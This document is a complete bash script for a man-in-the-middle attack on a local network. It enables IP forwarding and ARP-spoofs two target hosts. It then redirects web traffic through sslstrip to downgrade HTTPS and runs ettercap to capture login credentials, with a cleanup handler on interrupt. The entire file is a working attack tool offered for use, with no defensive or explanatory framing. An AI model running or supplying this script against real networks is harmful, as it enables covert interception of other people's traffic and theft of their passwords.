#!/bin/bash
# MITM script to poison the ARP cache of the target and run sslstrip and 
# ettercap to capture login credentials.

function cleanup {
	echo "* cleaning up"
	killall ettercap
	killall sslstrip
	iptables -t nat -D PREROUTING 1
	echo 0 > /proc/sys/net/ipv4/ip_forward
	exit 0
}

if [[ $# -ne 3 ]]; then
	echo "usage: `basename $0` <target1> <target2> <interface>"
	exit 0
fi

trap cleanup INT

echo "* enabling IPv4 forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "* ARP spoofing between $1 and $2"
killall arpspoof
arpspoof -i $3 -t $1 $2 > /dev/null 2>&1 &

echo "* setup iptables rules"
iptables -t nat -D PREROUTING 1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

echo "* starting sslstrip"
killall sslstrip
sslstrip -a -f -k &

echo "* starting ettercap"
killall ettercap
ettercap -T -q -a $HOME/cfg/snuff.etter.conf -i $3
